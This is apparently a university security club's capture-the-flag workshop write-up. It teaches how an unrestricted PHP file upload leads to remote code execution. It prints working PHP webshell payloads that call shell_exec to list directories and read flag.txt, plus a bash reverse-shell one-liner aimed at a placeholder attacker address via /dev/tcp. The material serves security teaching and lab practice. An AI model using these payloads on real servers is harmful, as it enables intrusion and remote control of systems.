# bacebook | Web Exploitation | UtahSec 2025-11-12

Author: Carson He (zakstamaj)

CTF technical skills workshop on a PHP LFI (local file inclusion) vulnerability leading to RCE (remote code execution).

Challenge website: http://35.161.63.210/

## Initial analysis

Explore the website a little! Try making an account and look at the profile page.

Take a brief look at the source code of the application running on the server. Don't worry about understanding all of the code, but note that the application is written in PHP, which is a server-side scripting language.

If we can upload our own PHP files to the server and request them, then the PHP interpreter would process and excute our PHP file, achieving RCE (remote code execution).

## Uploading files

Can you find a feature of the website that allows you to upload files?

<details>
<summary>Answer (click to reveal)</summary>

After you make an account, you can access the profile page, which has a feature allowing you to upload files and store one file on the server.
</details>

## PHP RCE payload

Now that you have identified the file upload feature, it's time to craft a payload and try to achieve RCE.

Create a file called `rce.php` and put the following contents in it:

```
<?php echo "pwned!"; ?>
```

This is a PHP script that simply prints out the message "pwned!". However, if we can get the server to execute this simple code, then we can modify our payload to do much more nefarious things.

Try uploading `rce.php` and then opening the link to the file. What do you see?

If you saw a blank page with the text "pwned!", then you have successfully achieved RCE. You can now make the server do what you want! Let's make it give us the flag. But where is the flag? In CTF challenges, if the flag is stored in a file, the file will usually be named `flag.txt`.

## Finding the flag

PHP has the function `shell_exec` which runs a shell command and returns the result. Note that the server is running Linux, so we will use Linux commands. Let's use it in our payload to gather some information, such as the files in the working directory:

```
<?php echo shell_exec("ls"); ?>
```

Did you see a `flag.txt`? If not, you can check our current working directory with `pwd`:

```
<?php echo shell_exec("pwd"); ?>
```

Also note that you can list files in the parent directory with `..`:

```
<?php echo shell_exec("ls .."); ?>
```

And you can chain `..` with forward slashes `/` to go back multiple directories:

```
<?php echo shell_exec("ls ../.."); ?>
```

Use these commands to find which directory has the file `flag.txt`. Once you have found `flag.txt`, use the `cat` command to print it out!

```
cat <path to file>
```

<details>
<summary>Answer (click to reveal)</summary>

`flag.txt` is located three directories back at `../../..`. You can print the flag with this payload:

```
<?php echo shell_exec("cat ../../../flag.txt"); ?>
```

Congratulations! You got the flag!
</details>

## Reverse shells

> [!NOTE]
> As a side note, when hackers are able to achieve RCE on a server, they often set up something called a "reverse shell". A reverse shell script starts a shell, makes the victim machine initiate a connection to the attacker's machine, and allows the attacker to run shell commands on the victim machine from their machine.
> 
> Here is an example of a reverse shell payload for PHP on Linux that runs a Bash shell:
> 
> ```
> <?php shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker IP address>/<port number> 0>&1'"); ?>
> ```
> 
> Getting a reverse shell to work on the university network would be very difficult, because the port forwarding on the routers would need to be configured, which we do not have control over.

## Conclusion

I hope you had fun and learned something from this challenge! This challenge was inspired by the Hack The Box PermX challenge, which used the CVE-2023-4220 vulnerability.
